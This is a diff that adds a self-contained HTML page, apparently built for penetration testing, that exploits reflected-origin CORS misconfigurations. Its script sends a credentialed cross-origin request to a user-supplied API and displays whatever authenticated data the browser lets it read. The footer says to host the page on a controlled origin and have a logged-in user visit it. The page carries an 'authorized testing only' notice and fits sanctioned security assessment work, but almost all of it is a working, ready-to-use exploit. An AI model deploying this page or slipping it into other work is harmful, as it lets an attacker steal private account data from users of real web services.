@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CORS Misconfiguration — Proof of Concept</title>
+<style>
+  :root {
+    --bg: #0f1115;
+    --panel: #171a21;
+    --panel-2: #1e222b;
+    --border: #2a2f3a;
+    --text: #e6e9ef;
+    --muted: #9aa3b2;
+    --accent: #5b8def;
+    --ok: #3fb950;
+    --bad: #f85149;
+    --warn: #d29922;
+    --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+    line-height: 1.5;
+  }
+  .wrap { max-width: 920px; margin: 0 auto; padding: 32px 20px 80px; }
+  header { border-bottom: 1px solid var(--border); padding-bottom: 20px; margin-bottom: 24px; }
+  h1 { font-size: 22px; margin: 0 0 6px; }
+  .sub { color: var(--muted); font-size: 14px; }
+  .notice {
+    background: rgba(210,153,34,.1);
+    border: 1px solid rgba(210,153,34,.4);
+    color: #e3c168;
+    padding: 12px 14px;
+    border-radius: 8px;
+    font-size: 13px;
+    margin: 18px 0 26px;
+  }
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 20px;
+  }
+  label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 6px; }
+  input[type=text] {
+    width: 100%;
+    background: var(--panel-2);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 10px 12px;
+    border-radius: 7px;
+    font-family: var(--mono);
+    font-size: 13px;
+  }
+  .row { display: flex; gap: 14px; flex-wrap: wrap; }
+  .row > div { flex: 1; min-width: 220px; }
+  .opts { display: flex; gap: 20px; flex-wrap: wrap; margin-top: 14px; font-size: 13px; color: var(--muted); }
+  .opts label { display: flex; align-items: center; gap: 7px; margin: 0; cursor: pointer; }
+  button {
+    margin-top: 18px;
+    background: var(--accent);
+    color: #fff;
+    border: none;
+    padding: 11px 20px;
+    border-radius: 7px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  button:hover { filter: brightness(1.08); }
+  button:disabled { opacity: .5; cursor: default; }
+  .verdict { font-size: 16px; font-weight: 700; margin-bottom: 14px; }
+  .verdict.bad { color: var(--bad); }
+  .verdict.ok { color: var(--ok); }
+  .verdict.warn { color: var(--warn); }
+  .checks { list-style: none; padding: 0; margin: 0 0 18px; }
+  .checks li {
+    display: flex; gap: 10px; padding: 8px 0;
+    border-bottom: 1px solid var(--border); font-size: 14px;
+  }
+  .checks li:last-child { border-bottom: none; }
+  .tag { font-family: var(--mono); font-size: 12px; }
+  .pass { color: var(--bad); }   /* a "passing" exploit check = bad for the target */
+  .fail { color: var(--ok); }
+  .dim { color: var(--muted); }
+  pre {
+    background: #0b0d12;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px;
+    overflow: auto;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    color: #cdd6e4;
+    max-height: 340px;
+  }
+  .hidden { display: none; }
+  .meta { font-family: var(--mono); font-size: 12px; color: var(--muted); margin: 2px 0; word-break: break-all; }
+  footer { color: var(--muted); font-size: 12px; margin-top: 30px; text-align: center; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <h1>CORS Misconfiguration — Proof of Concept</h1>
+    <div class="sub">Demonstrates cross-origin read of authenticated data via a reflected <span class="tag">Origin</span> header.</div>
+  </header>
+
+  <div class="notice">
+    <strong>Authorized testing only.</strong> This page is a demonstration artifact for a sanctioned
+    security assessment. It must only be pointed at a target that is in scope and that you have written
+    authorization to test. Current origin serving this page: <span class="tag" id="self-origin"></span>
+  </div>
+
+  <div class="panel">
+    <div class="row">
+      <div>
+        <label for="target">Target endpoint (an authenticated, in-scope API that returns sensitive data)</label>
+        <input type="text" id="target" placeholder="https://api.target.example/account/me">
+      </div>
+    </div>
+    <div class="opts">
+      <label><input type="checkbox" id="creds" checked> Send credentials (cookies) &mdash; <span class="dim">credentials: "include"</span></label>
+      <label><input type="checkbox" id="rawhdr"> Show raw response headers (if readable)</label>
+    </div>
+    <button id="run">Run proof of concept</button>
+  </div>
+
+  <div class="panel hidden" id="results">
+    <div class="verdict" id="verdict"></div>
+
+    <ul class="checks" id="checks"></ul>
+
+    <label>Attacker origin sent in request</label>
+    <div class="meta" id="sent-origin"></div>
+
+    <label style="margin-top:14px">Server's <span class="tag">Access-Control-Allow-Origin</span></label>
+    <div class="meta" id="acao"></div>
+
+    <label style="margin-top:14px">Server's <span class="tag">Access-Control-Allow-Credentials</span></label>
+    <div class="meta" id="acac"></div>
+
+    <label style="margin-top:18px">Data read cross-origin (the proof of impact)</label>
+    <pre id="body"></pre>
+  </div>
+
+  <footer>
+    Reflected-origin CORS PoC &middot; serve from an origin you control, visit while authenticated to the target.
+  </footer>
+</div>
+
+<script>
+const self_origin = location.origin;
+document.getElementById('self-origin').textContent = self_origin;
+
+function li(label, passed, detail) {
+  // "passed" here means the exploit condition held = bad for the target
+  const cls = passed ? 'pass' : 'fail';
+  const mark = passed ? '✗ vulnerable' : '✓ safe';
+  return `<li><span class="${cls}" style="min-width:110px">${mark}</span>
+          <span>${label}${detail ? ` <span class="dim">— ${detail}</span>` : ''}</span></li>`;
+}
+
+document.getElementById('run').addEventListener('click', async () => {
+  const target = document.getElementById('target').value.trim();
+  const useCreds = document.getElementById('creds').checked;
+  const showHdr = document.getElementById('rawhdr').checked;
+  const btn = document.getElementById('run');
+
+  if (!target) { alert('Enter the target endpoint.'); return; }
+
+  btn.disabled = true; btn.textContent = 'Running…';
+  const results = document.getElementById('results');
+  results.classList.remove('hidden');
+
+  const sentOrigin = self_origin;
+  document.getElementById('sent-origin').textContent = sentOrigin;
+
+  let bodyText = '', acao = '(not readable from script)', acac = '(not readable from script)';
+  let readable = false, err = null, status = null;
+
+  try {
+    const res = await fetch(target, {
+      method: 'GET',
+      credentials: useCreds ? 'include' : 'omit',
+      mode: 'cors'
+    });
+    status = res.status;
+    // These are only exposed to script on same-origin or simple response headers;
+    // for CORS they confirm the browser allowed the read.
+    acao = res.headers.get('access-control-allow-origin') ?? '(not exposed to script)';
+    acac = res.headers.get('access-control-allow-credentials') ?? '(not exposed to script)';
+    bodyText = await res.text();      // if this succeeds cross-origin, the read was permitted
+    readable = true;
+    if (showHdr) {
+      let hdrs = '';
+      for (const [k, v] of res.headers.entries()) hdrs += `${k}: ${v}\n`;
+      bodyText = `--- readable response headers ---\n${hdrs}\n--- body ---\n${bodyText}`;
+    }
+  } catch (e) {
+    err = e;
+  }
+
+  const checks = [];
+  checks.push(li('Cross-origin request completed', status !== null, status !== null ? `HTTP ${status}` : 'blocked / network error'));
+  checks.push(li('Response body readable by attacker origin', readable,
+    readable ? 'browser permitted the cross-origin read' : (err ? 'blocked by CORS (good)' : '')));
+  if (useCreds) checks.push(li('Request sent with victim credentials', true, 'cookies included'));
+
+  document.getElementById('checks').innerHTML = checks.join('');
+  document.getElementById('acao').textContent = acao;
+  document.getElementById('acac').textContent = acac;
+
+  const verdict = document.getElementById('verdict');
+  if (readable && useCreds) {
+    verdict.className = 'verdict bad';
+    verdict.textContent = 'VULNERABLE — authenticated data was read from a foreign origin';
+  } else if (readable) {
+    verdict.className = 'verdict warn';
+    verdict.textContent = 'Reflected read succeeded (no credentials) — review whether endpoint exposes sensitive data';
+  } else {
+    verdict.className = 'verdict ok';
+    verdict.textContent = 'Read was blocked by the browser — this endpoint is not exploitable this way';
+  }
+
+  document.getElementById('body').textContent =
+    readable ? (bodyText || '(empty response body)')
+             : `Request did not yield a readable response.\n${err ? err.toString() : ''}\n\n` +
+               `Note: a browser CORS block is itself evidence the policy is working. ` +
+               `If you expected a successful read, re-check that this page's origin (${self_origin}) ` +
+               `is the one being reflected, and that you are authenticated to the target.`;
+
+  btn.disabled = false; btn.textContent = 'Run proof of concept';
+});
+</script>
+</body>
+</html>
